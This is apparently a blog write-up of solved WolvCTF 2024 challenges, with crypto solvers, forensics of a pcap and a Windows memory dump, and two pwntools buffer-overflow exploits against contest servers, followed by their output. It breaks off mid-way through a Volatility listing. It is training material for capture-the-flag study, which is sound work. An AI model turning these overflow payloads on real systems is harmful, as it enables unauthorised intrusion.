Clicker Cryptography RSA-256 Forensics Contracts Beginner Basic Reversing Problem Overview\rAuthor: By Khael (@malfuncti0nal on discord) Description: So many function calls\u0026hellip; but are they that different?","tags":[],"title":"UTCTF 2024"},{"content":"https://ctftime.org/event/2240\nCHALL\u0026rsquo;S SOLVED Category Challenge Beginner Crypto: yORs Truly \u0026lt;3 Beginner Crypto: TwoTimePad Beginner Forensics: Hidden Data Beginner Pwn: babypwn Beginner Pwn: babypwn2 Beginner Rev: babyre Crypto Limited 1 Forensics Eternally Pwned: Infiltration Forensics Eternally Pwned: Persistence Misc Made Sense Misc Made Functional Beginner Crypto: yORs Truly \u0026lt;3 Overview\rAuthor: shlswnt Description: I have encrypted some text but it seems I have lost the key! Can you find it? Unlock Hint for 0 points: A string of text can be decrypted by merely reapplying the XOR function with the key\nyors-truly.py Given th first chall crypto beginner, this is a classic XOR encryption problem. The plaintext is XORed with a key to get the ciphertext. If we lost the key but have the plaintext and the ciphertext, we can retrieve the key by XORing the plaintext and the ciphertext.\nyors-truly.py\r1import base64 2 3plaintext = \u0026#34;A string of text can be encrypted by applying the bitwise XOR operator to every character using a given key\u0026#34; 4key = \u0026#34;\u0026#34; # I have lost the key! 5 6def byte_xor(ba1, ba2): 7 return bytes([_a ^ _b for _a, _b in zip(ba1, ba2)]) 8 9ciphertext_b64 = base64.b64encode(byte_xor(key.encode(), plaintext.encode())) 10 11ciphertext_decoded = base64.b64decode(\u0026#34;NkMHEgkxXjV/BlN/ElUKMVZQEzFtGzpsVTgGDw==\u0026#34;) 12 13print(ciphertext_decoded)\rHere\u0026rsquo;s how we can modify the code to find the key:\nsolver.py\r1import base64 2 3plaintext = \u0026#34;A string of text can be encrypted by applying the bitwise XOR operator to every character using a given key\u0026#34; 4 5def byte_xor(ba1, ba2): 6 return bytes([_a ^ _b for _a, _b in zip(ba1, ba2)]) 7 8ciphertext_decoded = base64.b64decode(\u0026#34;NkMHEgkxXjV/BlN/ElUKMVZQEzFtGzpsVTgGDw==\u0026#34;) 9 10key = byte_xor(plaintext.encode(), ciphertext_decoded) 11 12print(key)\rThis will print the key that was used to encrypt the plaintext.\nFLAG\rwctf{X0R_i5_f0rEv3r_My_L0Ve}\nCrypto: TwoTimePad Overview\rAuthor: cogsworth64 Description: One-time pads are perfectly information-theoretically secure, so I should be safe, right? chall.py eFlag.bmp eWolverine.bmp\nSecond challenge crypto beginner is a classic example of the misuse a one-time pad (OTP). Called TwoTimePad is a hint towards this. The key should be random, secret, and never reused. However in this challenge, the same key is used to encrypt two different encrypted files (eWolverine.bmp \u0026amp; eFlag.bmp).\nchall.py\r1from Crypto.Random import random, get_random_bytes 2 3BLOCK_SIZE = 16 4 5with(open(\u0026#39;./genFiles/wolverine.bmp\u0026#39;, \u0026#39;rb\u0026#39;)) as f: 6 wolverine = f.read() 7with(open(\u0026#39;./genFiles/flag.bmp\u0026#39;, \u0026#39;rb\u0026#39;)) as f: 8 flag = f.read() 9 10w = open(\u0026#39;eWolverine.bmp\u0026#39;, \u0026#39;wb\u0026#39;) 11f = open(\u0026#39;eFlag.bmp\u0026#39;, \u0026#39;wb\u0026#39;) 12 13f.write(flag[:55]) 14w.write(wolverine[:55]) 15 16for i in range(55, len(wolverine), BLOCK_SIZE): 17 KEY = get_random_bytes(BLOCK_SIZE) 18 w.write(bytes(a^b for a, b in zip(wolverine[i:i+BLOCK_SIZE], KEY))) 19 f.write(bytes(a^b for a, b in zip(flag[i:i+BLOCK_SIZE], KEY)))\rThe headers of the BMP files contain important information such as the size, color depth, compression method, etc. In the provided Python script, the headers of the original images are preserved. However, if we XOR the two encrypted images together, the headers are also XOR-ed.\nThen, we need to XOR the two encrypted images together. Since the same key was used for both, this will effectively cancel out the key, leaving with the XOR of the two original images.\nsolver.py\r1HEADER_SIZE = 55 # Size of the BMP header 2 3with open(\u0026#39;eWolverine.bmp\u0026#39;, \u0026#39;rb\u0026#39;) as f: 4 eWolverine = f.read() 5with open(\u0026#39;eFlag.bmp\u0026#39;, \u0026#39;rb\u0026#39;) as f: 6 eFlag = f.read() 7 8header = eWolverine[:HEADER_SIZE] 9 10xor = header + bytes(a^b for a, b in zip(eWolverine[HEADER_SIZE:], eFlag[HEADER_SIZE:])) 11 12with open(\u0026#39;out.bmp\u0026#39;, \u0026#39;wb\u0026#39;) as f: 13 f.write(xor)\rFLAG\rwctf{D0NT_R3CYCLE_K3Y5}\nForensics: Hidden Data Overview\rAuthor: dree_ Description: WOLPHV sent me this file. Not sure what to comment about it wctf_evil.jpg\nGiven an image file of Wolv CTF logo,\nI was assumed there\u0026rsquo;s a flag on the metadata or like LSB hidden-data, and if we take look at the metada of it, we can find the flag instantly in Comment tag\n$ exiftool wctf_evil.jpg ExifTool Version Number : 12.40 File Name : wctf_evil.jpg Directory : . File Size : 11 KiB File Modification Date/Time : 2024:03:15 17:23:14+07:00 File Access Date/Time : 2024:03:18 05:44:58+07:00 File Inode Change Date/Time : 2024:03:16 11:14:42+07:00 File Permissions : -rw-r--r-- File Type : JPEG File Type Extension : jpg MIME Type : image/jpeg JFIF Version : 1.01 Resolution Unit : None X Resolution : 1 Y Resolution : 1 Comment : wctf{h1dd3n_d4t4_n0T_s0_h1dD3N} Image Width : 250 Image Height : 307 Encoding Process : Progressive DCT, Huffman coding Bits Per Sample : 8 Color Components : 3 Y Cb Cr Sub Sampling : YCbCr4:2:0 (2 2) Image Size : 250x307 Megapixels : 0.077\r$ file wctf_evil.jpg wctf_evil.jpg: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, comment: \u0026#34;wctf{h1dd3n_d4t4_n0T_s0_h1dD3N}\u0026#34;, progressive, precision 8, 250x307, components 3\rFLAG\rwctf{h1dd3n_d4t4_n0T_s0_h1dD3N}\nPwn: babypwn Overview\rAuthor: iqlusion Description: Just a little baby pwn. Connection: nc babypwn.wolvctf.io 1337\nbabypwn babypwn.c\nGiven two attachments of this challenge babypwn \u0026amp; babypwn.c, is a baby bof (buffer overflow) vulnerability.\ndetermine file type \u0026amp; check binary elf protection\r$ file babypwn babypwn: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, not stripped $ checksec babypwn [*] \u0026#39;/home/nopedawn/CCUG/WolvCTF24/babypwn/babypwn\u0026#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000)\rbabypwn.c\r1#include \u0026lt;stdio.h\u0026gt; 2#include \u0026lt;string.h\u0026gt; 3#include \u0026lt;unistd.h\u0026gt; 4 5struct __attribute__((__packed__)) data { 6 char buff[32]; 7 int check; 8}; 9 10void ignore(void) 11{ 12 setvbuf(stdout, NULL, _IONBF, 0); 13 setvbuf(stdin, NULL, _IONBF, 0); 14} 15 16void get_flag(void) 17{ 18 char flag[1024] = { 0 }; 19 FILE *fp = fopen(\u0026#34;flag.txt\u0026#34;, \u0026#34;r\u0026#34;); 20 fgets(flag, 1023, fp); 21 printf(flag); 22} 23 24int main(void) 25{ 26 struct data name; 27 ignore(); /* ignore this function */ 28 29 printf(\u0026#34;What\u0026#39;s your name?\\n\u0026#34;); 30 fgets(name.buff, 64, stdin); 31 sleep(2); 32 printf(\u0026#34;%s nice to meet you!\\n\u0026#34;, name.buff); 33 sleep(2); 34 printf(\u0026#34;Binary exploitation is the best!\\n\u0026#34;); 35 sleep(2); 36 printf(\u0026#34;Memory unsafe languages rely on coders to not make mistakes.\\n\u0026#34;); 37 sleep(2); 38 printf(\u0026#34;But I don\u0026#39;t worry, I write perfect code :)\\n\u0026#34;); 39 sleep(2); 40 41 if (name.check == 0x41414141) { 42 get_flag(); 43 } 44 45 return 0; 46}\rThe fgets function in the main function reads 64 bytes into name.buff, which is only 32 bytes long. This can lead to an overflow of the check variable if more than 32 bytes are entered.\nTo exploit this, we need to enter 32 bytes to fill up the buff array, and then 4 more bytes to overwrite the check variable with the value 0x41414141. Here\u0026rsquo;s an solver:\nsolver.py\r1from pwn import * 2 3def exploit(io): 4 io.recvuntil(b\u0026#34;What\u0026#39;s your name?\u0026#34;) 5 6 payload = b\u0026#39;A\u0026#39; * 32 7 payload += p32(0x41414141) 8 io.sendline(payload) 9 10 # output = io.recvall() 11 # print(output) 12 io.interactive() 13 14if __name__ == \u0026#34;__main__\u0026#34;: 15 context.update(log_level=\u0026#39;debug\u0026#39;) 16 try: 17 io = remote(\u0026#39;babypwn.wolvctf.io\u0026#39;, 1337) 18 exploit(io) 19 except: 20 io = process(\u0026#39;./babypwn\u0026#39;) 21 exploit(io)\rrunning\r$ python3 solver.py [+] Opening connection to babypwn.wolvctf.io on port 1337: Done [DEBUG] Received 0x1e bytes: b\u0026#39;== proof-of-work: disabled ==\\n\u0026#39; [DEBUG] Received 0x12 bytes: b\u0026#34;What\u0026#39;s your name?\\n\u0026#34; [DEBUG] Sent 0x25 bytes: b\u0026#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\n\u0026#39; [*] Switching to interactive mode [DEBUG] Received 0x38 bytes: b\u0026#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\n\u0026#39; b\u0026#39; nice to meet you!\\n\u0026#39; AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA nice to meet you! [DEBUG] Received 0x21 bytes: b\u0026#39;Binary exploitation is the best!\\n\u0026#39; Binary exploitation is the best! [DEBUG] Received 0x3d bytes: b\u0026#39;Memory unsafe languages rely on coders to not make mistakes.\\n\u0026#39; Memory unsafe languages rely on coders to not make mistakes. [DEBUG] Received 0x2b bytes: b\u0026#34;But I don\u0026#39;t worry, I write perfect code :)\\n\u0026#34; But I don\u0026#39;t worry, I write perfect code :) [DEBUG] Received 0x20 bytes: b\u0026#39;wctf{pwn_1s_th3_best_Categ0ry!}\\n\u0026#39; wctf{pwn_1s_th3_best_Categ0ry!} [*] Got EOF while reading in interactive $ q [DEBUG] Sent 0x2 bytes: b\u0026#39;q\\n\u0026#39; $ q [DEBUG] Sent 0x2 bytes: b\u0026#39;q\\n\u0026#39; [*] Closed connection to babypwn.wolvctf.io port 1337 [*] Got EOF while sending in interactive\rFLAG\rwctf{pwn_1s_th3_best_Categ0ry!}\nPwn: babypwn2 Overview\rAuthor: retu2libc Description: A harder babypwn. Connection: nc babypwn2.wolvctf.io 1337\nbabypwn2 babypwn2.c\nThe second one is babypwn2\ndetermine file type \u0026amp; check binary elf protection\r$ file babypwn2 \u0026amp;\u0026amp; checksec babypwn2 babypwn2: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, not stripped [*] \u0026#39;/home/nopedawn/CCUG/WolvCTF24/babypwn2/babypwn2\u0026#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000)\rbabypwn2.c\r1#include \u0026lt;stdio.h\u0026gt; 2#include \u0026lt;unistd.h\u0026gt; 3 4/* ignore this function */ 5void ignore() 6{ 7 setvbuf(stdout, NULL, _IONBF, 0); 8 setvbuf(stdin, NULL, _IONBF, 0); 9} 10 11void get_flag() 12{ 13 char *args[] = {\u0026#34;/bin/cat\u0026#34;, \u0026#34;flag.txt\u0026#34;, NULL}; 14 execve(args[0], args, NULL); 15} 16 17int main() 18{ 19 ignore(); 20 char buf[0x20]; 21 printf(\u0026#34;What\u0026#39;s your name?\\n\u0026gt;\u0026gt; \u0026#34;); 22 gets(buf); 23 printf(\u0026#34;Hi %s!\\n\u0026#34;, buf); 24 return 0; 25}\rThe gets function is dangerous because it does not check the size of the input, which can lead to a buffer overflow. In this case, the buffer buf is of size 0x20 (32 bytes), but gets will write past the end of the buffer if given an input larger than 32 bytes.\nfind get_flag address\r$ gdb ./babypwn2 gef➤ info functions All defined functions: Non-debugging symbols: 0x0000000000401000 _init 0x0000000000401030 printf@plt 0x0000000000401040 execve@plt 0x0000000000401050 gets@plt 0x0000000000401060 setvbuf@plt 0x0000000000401070 _start 0x00000000004010a0 _dl_relocate_static_pie 0x00000000004010b0 deregister_tm_clones 0x00000000004010e0 register_tm_clones 0x0000000000401120 __do_global_dtors_aux 0x0000000000401150 frame_dummy 0x0000000000401152 ignore 0x0000000000401195 get_flag 0x00000000004011d0 main 0x0000000000401220 __libc_csu_init 0x0000000000401280 __libc_csu_fini 0x0000000000401284 _fini gef➤\rThe goal here is to overwrite the return address of the main function with the address of the get_flag function. This can be done by sending an input of 32 bytes (to fill up the buffer) plus the size of the saved base pointer (usually 8 bytes on a 64-bit system), followed by the address of the get_flag function.\nsolver.py\r1from pwn import * 2 3def exploit(io): 4 io.recvuntil(b\u0026#34;What\u0026#39;s your name?\u0026#34;) 5 6 get_flag_address = 0x401195 7 8 payload = b\u0026#39;A\u0026#39; * 32 9 payload += b\u0026#39;B\u0026#39; * 8 10 payload += p64(get_flag_address) 11 io.sendline(payload) 12 13 # output = io.recvall() 14 # print(output) 15 io.interactive() 16 17if __name__ == \u0026#34;__main__\u0026#34;: 18 context.update(log_level=\u0026#39;debug\u0026#39;) 19 try: 20 io = remote(\u0026#39;babypwn2.wolvctf.io\u0026#39;, 1337) 21 exploit(io) 22 except: 23 io = process(\u0026#39;./babypwn2\u0026#39;) 24 exploit(io)\rrunning\r$ python3 solver.py [+] Opening connection to babypwn2.wolvctf.io on port 1337: Done [DEBUG] Received 0x1e bytes: b\u0026#39;== proof-of-work: disabled ==\\n\u0026#39; [DEBUG] Received 0x15 bytes: b\u0026#34;What\u0026#39;s your name?\\n\u0026#34; b\u0026#39;\u0026gt;\u0026gt; \u0026#39; [DEBUG] Sent 0x31 bytes: 00000000 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 │AAAA│AAAA│AAAA│AAAA│ * 00000020 42 42 42 42 42 42 42 42 95 11 40 00 00 00 00 00 │BBBB│BBBB│··@·│····│ 00000030 0a │·│ 00000031 [*] Switching to interactive mode \u0026gt;\u0026gt; [DEBUG] Received 0x52 bytes: 00000000 48 69 20 41 41 41 41 41 41 41 41 41 41 41 41 41 │Hi A│AAAA│AAAA│AAAA│ 00000010 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 │AAAA│AAAA│AAAA│AAAA│ 00000020 41 41 41 42 42 42 42 42 42 42 42 95 11 40 21 0a │AAAB│BBBB│BBB·│·@!·│ 00000030 77 63 74 66 7b 57 6f 34 68 5f 6c 30 6f 6b 5f 34 │wctf│{Wo4│h_l0│ok_4│ 00000040 74 5f 79 30 75 5f 68 34 63 6b 31 6e 67 5f 6d 33 │t_y0│u_h4│ck1n│g_m3│ 00000050 7d 0a │}·│ 00000052 Hi AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB\\x95\\x11@! wctf{Wo4h_l0ok_4t_y0u_h4ck1ng_m3} [*] Got EOF while reading in interactive $ q [DEBUG] Sent 0x2 bytes: b\u0026#39;q\\n\u0026#39; $ q [DEBUG] Sent 0x2 bytes: b\u0026#39;q\\n\u0026#39; [*] Closed connection to babypwn2.wolvctf.io port 1337 [*] Got EOF while sending in interactive\rFLAG\rwctf{Wo4h_l0ok_4t_y0u_h4ck1ng_m3}\nRev: babyre Overview\rAuthor: iqlusion Description: Just a wee-little baby re challenge. babyre\nThe next beginner challenge is Rev called babyre\nprompt\r$ ./babyre How are you today? I\u0026#39;m good Not sure how to react to that :/ Did you checkout our cool sponsors? You should totally check them out! I think I am forgetting something... Oh yea the flag! But where did I put it... I know its in here somewhere. Dratts! Can you help me find it? I swear its around here somewhere.\rWe can check on dissasembler like IDA Pro in strings segments\nor simply strings it, we can get the flag\n$ strings babyre | grep wctf wctf{n1c3_oNe_y0u_Found_m3}\rFLAG\rwctf{n1c3_oNe_y0u_Found_m3}\nCrypto Limited 1 Overview\rAuthor: catgut6675 Description: It\u0026rsquo;s pretty easy to find random integers if you know the seed, but what if every second has a different seed? chal_time.py\nchal_time.py\r1import time 2import random 3import sys 4 5if __name__ == \u0026#39;__main__\u0026#39;: 6 flag = input(\u0026#34;Flag? \u0026gt; \u0026#34;).encode(\u0026#39;utf-8\u0026#39;) 7 correct = [189, 24, 103, 164, 36, 233, 227, 172, 244, 213, 61, 62, 84, 124, 242, 100, 22, 94, 108, 230, 24, 190, 23, 228, 24] 8 time_cycle = int(time.time()) % 256 9 if len(flag) != len(correct): 10 print(\u0026#39;Nope :(\u0026#39;) 11 sys.exit(1) 12 for i in range(len(flag)): 13 random.seed(i+time_cycle) 14 if correct[i] != flag[i] ^ random.getrandbits(8): 15 print(\u0026#39;Nope :(\u0026#39;) 16 sys.exit(1) 17 print(flag)\rThe given Python script that uses the current time as a seed for the random number generator. The script then checks if the XOR of each character in the flag with a random 8-bit number equals the corresponding number in the correct list. If all checks pass, the flag is printed.\nTo do that, we need to reverse the process. Here\u0026rsquo;s the solver:\nsolver.py\r1import random 2 3correct = [189, 24, 103, 164, 36, 233, 227, 172, 244, 213, 61, 62, 84, 124, 242, 100, 22, 94, 108, 230, 24, 190, 23, 228, 24] 4 5for time_cycle in range(256): 6 flag = \u0026#34;\u0026#34; 7 for i in range(len(correct)): 8 random.seed(i+time_cycle) 9 char = correct[i] ^ random.getrandbits(8) 10 flag += chr(char) 11 12 if all(\u0026#39; \u0026#39; \u0026lt;= c \u0026lt;= \u0026#39;~\u0026#39; for c in flag): 13 print(f\u0026#34;time_cycle: {time_cycle}\\nflag: {flag} \u0026#34;)\r$ python3 solver.py time_cycle: 188 flag: wctf{f34R_0f_m1ss1ng_0ut}\rFLAG\rwctf{f34R_0f_m1ss1ng_0ut}\nForensics Eternally Pwned: Infiltration Overview\rAuthor: dree_ Description: I recently had my passwords and other sensitive data leaked, but I have no idea how. Can you figure out how the attacker got in to my PC? network-capture.pcap\nGiven the forensics challenge, we need to investigate data for evidence of network packet capture network-capture.png\nWe can investigate with Wireshark and analyze the every packet bytes, if we filter the most interraction is on tcp protocol \u0026amp; smb protocol. Both we\u0026rsquo;re gonna focusing on (tcp / smb) packet interraction.\nIf we filter the packet in number 446 \u0026amp; 550\nor filter tcp.stream eq 4 (both are same filtering)\nWe can see the bunch of \u0026ldquo;A\u0026rdquo; characters, and if wee look closely there\u0026rsquo;s look like a base64 string between the \u0026ldquo;A\u0026rdquo; characters\nNote that we have found these, next we can grep the base64 string or using tshark\n$ tshark -r network-capture.pcap -Y \u0026#34;frame.number == 446\u0026#34; -x 0000 00 0c 29 ce 19 19 00 0c 29 95 a9 e6 08 00 45 00 ..).....).....E. 0010 00 6d bc 93 40 00 40 06 f5 95 c0 a8 03 85 c0 a8 .m..@.@......... 0020 03 8c b6 f1 01 bd 3f d8 46 5d d3 e1 93 41 80 18 ......?.F]...A.. 0030 00 f9 b7 6e 00 00 01 01 08 0a 48 40 d9 94 00 00 ...n......H@.... 0040 72 c3 00 00 00 35 ff 53 4d 42 2b 00 00 00 00 18 r....5.SMB+..... 0050 01 60 00 00 00 00 00 00 00 00 00 00 00 00 00 00 .`.............. 0060 00 00 00 08 00 00 01 01 00 10 00 64 32 4e 30 5a ...........d2N0Z 0070 6e 74 73 4d 33 52 54 58 77 3d 3d ntsM3RTXw== $ echo \u0026#34;d2N0ZntsM3RTXw==\u0026#34; | base64 -d wctf{l3tS_\rWe\u0026rsquo;ve got the first part wctf{l3tS_\n$ tshark -r network-capture.pcap -Y \u0026#34;frame.number == 550\u0026#34; -x 0d20 41 41 41 41 4d 33 52 6c 55 6d 34 30 62 45 78 35 AAAAM3RlUm40bEx5 0d30 58 32 63 77 58 77 3d 3d 41 41 41 41 41 41 41 41 X2cwXw==AAAAAAAA 0f20 41 41 41 41 41 41 41 41 41 41 41 41 59 6b 78 56 AAAAAAAAAAAAYkxV 0f30 4d 31 38 33 62 6a 6c 33 62 54 52 70 56 32 35 4d M183bjl3bTRpV25M 0f40 66 51 3d 3d 41 41 41 41 41 41 41 41 41 41 41 41 fQ==AAAAAAAAAAAA $ echo \u0026#34;M3RlUm40bEx5X2cwXw==\u0026#34; | base64 -d 3teRn4lLy_g0_ $ echo \u0026#34;YkxVM183bjl3bTRpV25MfQ==\u0026#34; | base64 -d bLU3_7n9wm4iWnL}\rthen the two last part 3teRn4lLy_g0_ \u0026amp; bLU3_7n9wm4iWnL}\nFLAG\rwctf{l3tS_3teRn4lLy_g0_bLU3_7n9wm4iWnL}\nEternally Pwned: Persistence Overview\rAuthor: dree_ Description: I get that the attackers were in my PC, but how did they achieve persistence? MEMORY.DMP\nThe next forensics challenge is Persistence, that we have to investigate the dump of memory unknown profile\nSo we can use strings or another method to determine some profile informations like trying this examples:\n$ strings MEMORY.DMP | grep \u0026quot;notepad\u0026quot;\n$ strings MEMORY.DMP | grep \u0026quot;microsoft\u0026quot;\n$ strings MEMORY.DMP | grep \u0026quot;windows\u0026quot;\n(a bit ridiculous, but helpful 🗿)\nNote that we have already know this is a dump of windows, so we can retrieve the information of it with Volatility 3\nwindows.info\r$ volatility3 -f MEMORY.DMP windows.info Volatility 3 Framework 2.5.0 Progress: 100.00 PDB scanning finished Variable Value Kernel Base 0xf80001852000 DTB 0x187000 Symbols file:///home/nopedawn/volatility3/volatility3/symbols/windows/ntkrnlmp.pdb/3844DBB920174967BE7AA4A2C20430FA-2.json.xz Is64Bit True IsPAE False layer_name 0 WindowsIntel32e memory_layer 1 WindowsCrashDump64Layer base_layer 2 FileLayer KdDebuggerDataBlock 0xf80001a430a0 NTBuildLab 7601.17514.amd64fre.win7sp1_rtm. CSDVersion 1 KdVersionBlock 0xf80001a43068 Major/Minor 15.7601 MachineType 34404 KeNumberProcessors 1 SystemTime 2024-03-09 12:05:40 NtSystemRoot C:\\Windows NtProductType NtProductServer NtMajorVersion 6 NtMinorVersion 1 PE MajorOperatingSystemVersion 6 PE MinorOperatingSystemVersion 1 PE Machine 34404 PE TimeDateStamp Sat Nov 20 09:30:02 2010\rSee! It\u0026rsquo;s a dump of windows, now we can retrieve the information of process are running\nwindows.pstree\r$ volatility3 -f MEMORY.DMP windows.pstree Volatility 3 Framework 2.5.0 Progress: 100.00 PDB scanning finished PID PPID ImageFileName Offset(V) Threads Handles SessionId Wow64 CreateTime ExitTime 4 0 System 0xfa8018d8db30 71 497 N/A False 2024-03-09 11:47:48.000000 N/A * 224 4 smss.exe 0xfa8019c06310 2 29 N/A False 2024-03-09 11:47:48.000000 N/A 296 288 csrss.exe 0xfa801a39a750 9 341 0 False 2024-03-09 11:47:49.000000 N/A 348 288 wininit.exe 0xfa801a3b8b30 4 77 0 False 2024-03-09 11:47:49.000000 N/A * 468 348 lsm.exe 0xfa801a40eb30 11 144 0 False 2024-03-09 11:47:49.000000 N/A * 460 348 lsass.exe 0xfa801a4083b0 8 569 0 False 2024-03-09 11:47:49.000000 N/A * 444 348 services.exe 0xfa801a3ff5f0 9 200 0 False 2024-03-09 11:47:49.000000 N/A ** 640 444 svchost.exe 0xfa801a54bb30 9 243 0 False 2024-03-09 11:47:50.000000 N/A ** 1536 444 spoolsv.exe 0xfa801a93fb30 13 254 0 False 2024-03-09 11:56:05.000000 N/A ** 908 444 svchost.exe 0xfa801a5ccb30 8 197 0 False 2024-03-09 11:47:50.000000 N/A *** 1304 908 dwm.exe 0xfa801a75a060 4 66 1 False 2024-03-09 11:47:51.000000 N/A ** 1040 444 svchost.exe 0xfa801a6d0060 4 46 0 False 2024-03-09 11:47:51.000000 N/A ** 2040 444 mscorsvw.exe 0xfa801a85db30 8 84 0 True 2024-03-09 11:49:52.000000 N/A ** 1956 444 sppsvc.exe 0xfa801a87f4f0 5 151 0 False 2024-03-09 11:47:59.000000 N/A ** 812 444 svchost.exe 0xfa801a5a49e0 34 953 0 False 2024-03-09 11:47:50.000000 N/A ** 1200 444 taskhost.exe 0xfa801a722b30 6 117 1 False 2024-03-09 11:47:51.000000 N/A ** 692 444 svchost.exe 0xfa801a5645f0 14 288 0 False 2024-03-09 11:47:50.000000 N/A ** 948 444 svchost.exe 0xfa801a5dc5f0 17 441 0 False 2024-03-09 11:47:50.000000 N/A ** 1332 444 mscorsvw.exe 0xfa801a705060 8 75 0 False 2024-03-09 11:49:52.000000 N/A ** 312 444 spoolsv.exe 0xfa801a6a6670 0 - 0 False 2024-03-09 11:47:51.000000 2024-03-09 11:55:05.000000 ** 1852 444 msdtc.exe 0xfa8018e3e620 13 142 0 False 2024-03-09 11:49:53.000000 N/A ** 576 444 svchost.exe 0xfa801a521b30 12 348 0 False 2024-03-09 11:47:50.000000 N/A *** 1848 576 WmiPrvSE.exe 0xfa801a500a10 7 118 0 False 2024-03-09 12:04:55.000000 N/A *** 2052 576 WmiPrvSE.exe 0xfa801990fb30 9 248 0 False 2024-03-09 12:04:56.000000 N/A ** 1992 444 svchost.exe 0xfa801a46c220 6 67 0 False 2024-03-09 11:49:53.000000 N/A ** 860 444 svchost.exe 0xfa801a5c05a0 11 273 0 False 2024-03-09 11:47:50.000000 N/A ** 1380 444 svchost.exe 0xfa801a78e730 6 99 0 False 2024-03-09 11:47:52.000000 N/A ** 240 444 svchost.exe 0xfa801a41d060 18 295 0 False 2024-03-09 11:47:50.000000 N/A ** 2168 444 TrustedInstall 0xfa801a4fab30 7 223 0 False 2024-03-09 12:04:57.000000 N/A 360 340 csrss.exe 0xfa801a3bf060 7 266 1 False 2024-03-09 11:47:49.000000 N/A * 988 360 conhost.exe 0xfa801a85e1d0 2 38 1 False 2024-03-09 11:49:15.000000 N/A * 1868 360 conhost.exe 0xfa801a4a8630 2 38 1 False 2024-03-09 11:50:05.000000 N/A 408 340 winlogon.exe 0xfa801a3f75c0 4 97 1 False 2024-03-09 11:47:49.000000 N/A 1320 1292 explorer.exe 0xfa801a7637c0 30 712 1 False 2024-03-09 11:47:52.000000 N/A * 896 1320 multireader.ex 0xfa801a8601d0 2 57 1 False 2024-03-09 11:54:50.000000 N/A * 804 1320 cmd.exe 0xfa801a496450 1 21 1 False 2024-03-09 11:50:05.000000 N/A * 1644 1320 notepad.exe 0xfa801a4ba060 1 57 1 False 2024-03-09 11:52:04.000000 N/A * 1804 1320 cGFzdGViaW4uY2 0xfa801a8de800 8 258 1 False 2024-03-09 11:54:49.000000 N/A * 1680 1320 cmd.exe 0xfa801a862060 1 19 1 False 2024-03-09 11:49:15.000000 N/A * 1272 1320 iexplore.exe 0xfa801a983b30 11 381 1 True 2024-03-09 11:55:44.000000 N/A ** 1284 1272 iexplore.exe 0xfa801a503b30 16 348 1 True 2024-03-09 11:55:45.000000 N/A 2568 2492 taskmgr.exe 0xfa801ac2db30 7 124 1 False 2024-03-09 12:05:33.000000 N/A\rI see there is a strange process running on PID: 1804, look like base64 cGFzdGViaW4uY2\n$ echo \u0026#34;cGFzdGViaW4uY2\u0026#34; | base64 -d pastebin.c\rHmm, A pastebin running on windows? What about the command-line dump history?\nwindows.cmdline\r$ volatility3 -f MEMORY.DMP windows.cmdline Volatility 3 Framework 2.5.0 Progress: 100.00 PDB scanning finished PID Process Args 4 System Required memory at 0x20 is not valid (process exited?) 224 smss.exe \\SystemRoot\\System32\\smss.exe 296 csrss.exe %SystemRoot%\\system32\\csrss.exe ObjectDirectory=\\Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=winsrv:ConServerDllInitialization,2 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16 348 wininit.exe wininit.exe 360 csrss.exe %SystemRoot%\\system32\\csrss.exe ObjectDirectory=\\Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=winsrv:ConServerDllInitialization,2 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16 408 winlogon.exe winlogon.exe 444 services.exe C:\\Windows\\system32\\services.exe 460 lsass.exe C:\\Windows\\system32\\lsass.exe 468 lsm.exe C:\\Windows\\system32\\lsm.exe 576 svchost.exe C:\\Windows\\system32\\svchost.exe -k DcomLaunch 640 svchost.exe C:\\Windows\\system32\\svchost.exe -k RPCSS 692 svchost.exe C:\\Windows\\System32\\svchost.exe -k LocalServiceNetworkRestricted 812 svchost.exe C:\\Windows\\system32\\svchost.exe -k netsvcs 860 svchost.exe C:\\Windows\\system32\\svchost.exe -k LocalService 908 svchost.exe C:\\Windows\\System32\\svchost.exe -k LocalSystemNetworkRestricted 948 svchost.exe C:\\Windows\\system32\\svchost.exe -k NetworkService 240 svchost.exe C:\\Windows\\system32\\svchost.exe -k LocalServiceNoNetwork 312 spoolsv.exe Required memory at 0x7fffffdf020 is not valid (process exited?) 1040 svchost.exe C:\\Windows\\system32\\svchost.exe -k regsvc 1200 taskhost.exe \u0026#34;taskhost.exe\u0026#34; 1304 dwm.exe \u0026#34;C:\\Windows\\system32\\Dwm.exe\u0026#34; 1320 explorer.exe C:\\Windows\\Explorer.EXE 1380 svchost.exe C:\\Windows\\system32\\svchost.exe -k NetworkServiceNetworkRestricted 1956 sppsvc.exe C:\\Windows\\system32\\sppsvc.exe 1680 cmd.exe \u0026#34;C:\\Windows\\system32\\cmd.exe\u0026#34; 988 conhost.exe \\??\\C:\\Windows\\system32\\conhost.exe 2040 mscorsvw.exe C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\mscorsvw.exe 1332 mscorsvw.exe C:\\Windows\\Microsoft.NET\\Framework64\\v2.0.50727\\mscorsvw.exe 1992 svchost.exe C:\\Windows\\system32\\svchost.exe -k LocalServiceAndNoImpersonation 1852 msdtc.exe C:\\Windows\\System32\\msdtc.exe 804 cmd.exe \u0026#34;C:\\Windows\\system32\\cmd.exe\u0026#34; 1868 conhost.exe 